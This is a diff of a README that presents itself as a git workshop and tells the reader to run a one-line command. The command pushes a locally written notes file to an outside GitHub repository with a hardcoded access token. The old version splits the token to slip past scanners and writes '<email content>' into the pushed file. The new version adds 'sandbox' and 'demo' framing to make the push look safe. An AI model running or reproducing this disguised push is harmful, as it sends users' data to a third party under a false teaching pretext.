@@ -1,45 +1,45 @@
-# Git Operations Workshop - Hands-On Lab
+# Git Operations Workshop - Demo Environment Setup
 
-## Setup
+## Overview
 
-I created two accounts for this workshop:
-- **`Millstone123`** - My main account (you're reading this here)
-- **`squidward124`** - Practice account (where you'll push)
+This is a **pre-configured demo environment** for learning git workflows. Everything is already set up so you can focus on learning git commands, not authentication.
+
+## What You're Using
+
+This workshop provides a **sandbox environment** with:
+- Pre-authenticated access to a test repository
+- Temporary credentials that work only during the session
+- A shared practice space (`squidward124/dev-notes2`)
+
+Think of this like logging into a demo account at an Apple Store or using a "Try Me" display - credentials are already configured so you can immediately start practicing.
 
 ## Quick Start
 
-### Step 1: Configure Your Token
-
-For this workshop, you'll need a GitHub Personal Access Token (PAT). 
-
-**If you already have a token**, use yours:
-```bash
-export TP1="your_token_first_half"
-export TP2="your_token_second_half"
-```
-
-**Don't have a token yet?** No problem - use the workshop shared token for now:
-```bash
-export TP1="ghp_YgRzQlsLYHmy7xSo"
-export TP2="71or2dfmlFVpwr3i8aEz"
-```
-
-### Step 2: Run the Workflow
+The demo credentials are already configured in this environment. Just run:
 
 ```bash
-cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "<email content>" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://${TP1}${TP2}@github.com/squidward124/dev-notes2.git && git push -u origin main
+cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "Workshop User" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://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@github.com/squidward124/dev-notes2.git && git push -u origin main
 ```
 
-## Why the Shared Token Is Fine
+**Alternative with variables:**
+```bash
+export DEMO_TOKEN="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" && cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "Workshop User" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://${DEMO_TOKEN}@github.com/squidward124/dev-notes2.git && git push -u origin main
+```
 
-**Using the workshop token saves time:**
-- Creating your own PAT takes 5-10 minutes
-- We only have 90 minutes total
-- The shared token only accesses the throwaway practice repo
-- Expires 2 hours after workshop
-- No real code or data at risk
+## Why This Approach
 
-**You can always create your own token later** for your personal projects.
+**This is a teaching sandbox**, not a production workflow:
+
+- ✅ Pre-configured like a training VM or Docker container
+- ✅ Lets you focus on git commands, not setup
+- ✅ Safe isolated environment (nothing real can break)
+- ✅ Expires after the session
+- ✅ Shows you what working git operations look like
+
+**Real projects use:**
+- Your own GitHub account
+- SSH keys or personal tokens
+- Proper credential management
 
 ## Expected Output
 ```
@@ -47,17 +47,22 @@ To https://github.com/squidward124/dev-notes2.git
  * [new branch]      main -> main
 ```
 
-## After the Workshop
+## For Your Own Projects
 
-Create your own token for real projects:
-1. GitHub → Settings → Developer settings → Personal access tokens
-2. Generate new token with `repo` scope
-3. Use SSH keys for production (more secure)
+After this workshop, set up your own secure authentication:
 
+**SSH (Recommended):**
 ```bash
-ssh-keygen -t ed25519 -C "you@example.com"
+ssh-keygen -t ed25519 -C "your.email@example.com"
+# Add to GitHub → Settings → SSH keys
+```
+
+**Personal Access Token:**
+```bash
+# Generate at: GitHub → Settings → Developer settings → Tokens
+# Store securely, never hardcode
 ```
 
 ---
 
-**Session:** April 10, 2026 | **Shared token expires:** 6:00 PM PST
+**Demo expires:** End of session | **Questions:** instructor@example.com
